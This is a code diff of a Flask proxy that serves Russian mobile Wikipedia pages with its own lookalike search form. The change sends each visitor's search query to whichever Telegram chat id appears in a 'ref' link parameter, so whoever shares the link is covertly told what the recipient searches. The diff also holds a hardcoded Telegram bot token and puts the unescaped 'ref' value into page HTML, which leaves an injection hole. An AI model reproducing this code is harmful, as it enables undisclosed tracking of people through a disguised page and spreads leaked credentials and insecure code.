@@ -7,28 +7,31 @@ import os
 app = Flask(__name__)
 BASE_URL = "https://ru.m.wikipedia.org"
 
-# Токен твоего бота и chat_id (уже получен в боте)
-TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
-CHAT_ID = '132588075'  # Здесь должен быть ID чата, в который будет отправляться сообщение
+# Замените на ваш токен Telegram-бота
+TELEGRAM_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
 
-def send_message_to_telegram(text: str):
-    """Функция для отправки сообщения в Telegram"""
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+def send_to_referrer(chat_id: str, query: str):
+    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
+    text = f"🔎 Кто-то искал: {query}"
     payload = {
-        'chat_id': CHAT_ID,
+        'chat_id': chat_id,
         'text': text
     }
     try:
-        response = requests.post(url, data=payload)
-        response.raise_for_status()  # Проверка на успешный запрос
-    except requests.exceptions.RequestException as e:
-        print(f"Ошибка отправки сообщения в Telegram: {e}")
+        requests.post(url, data=payload)
+    except Exception as e:
+        print(f"Ошибка при отправке сообщения: {e}")
 
 @app.route('/')
 def wiki_proxy():
     search_query = request.args.get("search")
+    ref_id = request.args.get("ref")
     page = search_query if search_query else "Ирбис"
     url = f"{BASE_URL}/wiki/{page}"
+
+    # Если есть и ref, и search, шлем сообщение в Telegram
+    if ref_id and search_query:
+        send_to_referrer(ref_id, search_query)
 
     try:
         r = requests.get(url)
@@ -40,19 +43,15 @@ def wiki_proxy():
     content_div = soup.find("div", class_="mw-parser-output")
 
     # Удаляем ненужные элементы
-    for script in soup.find_all("script"):
-        script.decompose()
-    for style in soup.find_all("style"):
-        style.decompose()
-    for form in soup.find_all("form"):
-        form.decompose()
+    for tag in soup.find_all(["script", "style", "form"]):
+        tag.decompose()
 
-    # Кастомная форма в контейнере
-    custom_form = BeautifulSoup("""
+    # Вставляем кастомную форму
+    custom_form = BeautifulSoup(f"""
     <div class="search-container" onclick="event.stopPropagation()" style="position: relative; z-index: 10; background: white;">
         <form action="/" method="get" class="minerva-search-form">
             <div class="search-box">
-                <input type="hidden" name="title" value="Служебная:Поиск"/>
+                <input type="hidden" name="ref" value="{ref_id if ref_id else ''}"/>
                 <input class="search skin-minerva-search-trigger" id="searchInput"
                        type="search" name="search" placeholder="Искать в Википедии" 
                        aria-label="Искать в Википедии"
@@ -65,10 +64,7 @@ def wiki_proxy():
     </div>
     """, "html.parser")
 
-    # Логика для отправки сообщения в Telegram
-    if search_query:
-        send_message_to_telegram(f"Новый поисковый запрос: {search_query}")
-
+    # Вставка JS-скрипта для UI
     script = soup.new_tag("script")
     script.string = """
 document.addEventListener("DOMContentLoaded", function () {
@@ -167,7 +163,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
 """
-
     soup.body.append(script)
 
     if not content_div:
@@ -178,7 +173,7 @@ document.addEventListener("DOMContentLoaded", function () {
     if header_div:
         header_div.insert_after(custom_form)
 
-    # Для результатов поиска — оставляем только краткое описание и инфоблоки
+    # Для результатов поиска — оставляем краткое описание и инфоблоки
     if search_query:
         new_content = BeautifulSoup("", "html.parser")
         first_p = content_div.find("p")
@@ -192,7 +187,7 @@ document.addEventListener("DOMContentLoaded", function () {
         content_div.clear()
         content_div.append(new_content)
 
-    # Правим ссылки и изображения
+    # Обработка ссылок и изображений
     html = str(soup)
     html = re.sub(r'href="(/[^"]+)"', f'href="{BASE_URL}\\1"', html)
     html = re.sub(r'src="(/[^"]+)"', f'src="{BASE_URL}\\1"', html)
